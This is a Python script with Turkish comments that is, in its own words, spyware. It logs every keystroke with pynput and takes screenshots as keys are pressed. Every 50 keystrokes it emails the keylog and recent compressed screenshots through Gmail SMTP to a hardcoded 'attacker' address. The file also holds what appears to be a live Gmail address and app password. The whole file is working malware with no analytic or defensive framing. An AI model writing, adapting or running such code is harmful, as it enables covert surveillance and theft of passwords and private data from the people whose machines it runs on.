import os
import time
import smtplib
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener
from PIL import ImageGrab, Image

# Dosya ve klasör ayarları
keylog_file = "keylogs.txt"
screenshot_folder = "screenshots"

# E-posta bilgileri
attacker_email = "dfeanteimhe@gmail.com"
attacker_password = "glnj xjdz qyod swbn"
receiver_email = "dfeanteimhe@gmail.com"

# Global sayaçlar ve buffer
key_buffer = []
key_count = 0

# Ekran görüntüsünü sıkıştırma
def compress_image(input_path, output_path, quality=50):
    try:
        img = Image.open(input_path)
        img = img.convert("RGB")  # Bazı formatlar için gerekli olabilir
        img.save(output_path, "JPEG", quality=quality)
        print(f"Resim sıkıştırıldı: {output_path}")
    except Exception as e:
        print(f"Resim sıkıştırma hatası: {e}")

# E-posta gönderimi
def send_email():
    try:
        # SMTP bağlantısı başlat
        smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
        smtp_server.starttls()
        smtp_server.login(attacker_email, attacker_password)

        # E-posta içeriklerini oluştur
        msg = MIMEMultipart()
        msg["From"] = attacker_email
        msg["To"] = receiver_email
        msg["Subject"] = "Spyware: Toplanan Veriler"

        body = "Keylogger verileri ve ekran görüntüleri ektedir."
        msg.attach(MIMEText(body, "plain"))

        # Keylog dosyasını ekle
        if os.path.exists(keylog_file):
            with open(keylog_file, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(keylog_file)}")
            msg.attach(part)

        # Sadece son 10 ekran görüntüsünü sıkıştırarak ekle
        if os.path.exists(screenshot_folder):
            screenshots = sorted(os.listdir(screenshot_folder))[-10:]
            for screenshot in screenshots:
                file_path = os.path.join(screenshot_folder, screenshot)
                compressed_path = file_path.replace(".png", "_compressed.jpg")
                compress_image(file_path, compressed_path)  # Sıkıştırmayı uygula
                with open(compressed_path, "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(compressed_path)}")
                msg.attach(part)

        # E-posta gönder
        smtp_server.sendmail(attacker_email, receiver_email, msg.as_string())
        smtp_server.quit()
        print("E-posta başarıyla gönderildi.")
    except Exception as e:
        print(f"E-posta gönderim hatası: {e}")

# Ekran görüntüsü alma
def capture_screenshot():
    if not os.path.exists(screenshot_folder):
        os.makedirs(screenshot_folder)
    screenshot = ImageGrab.grab()
    file_path = os.path.join(screenshot_folder, f"screenshot_{int(time.time())}.png")
    screenshot.save(file_path)

# Tuş algılama işlemi
def on_press(key):
    global key_buffer, key_count

    try:
        key_buffer.append(key.char)
    except AttributeError:
        key_buffer.append(f"[{key}]")

    key_count += 1

    if key_count >= 5:
        # Ekran görüntüsünü ayrı bir thread'de al
        screenshot_thread = threading.Thread(target=capture_screenshot)
        screenshot_thread.start()

    if key_count >= 50:  # Her 50 tuşlamada bir işlem yap
        key_count = 0

        # Keylogger verilerini dosyaya yaz
        with open(keylog_file, "a") as file:
            file.write("".join(key_buffer))
        key_buffer = []

        # E-posta gönderimini ayrı bir thread'de çalıştır
        email_thread = threading.Thread(target=send_email)
        email_thread.start()

# Ana fonksiyon
def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
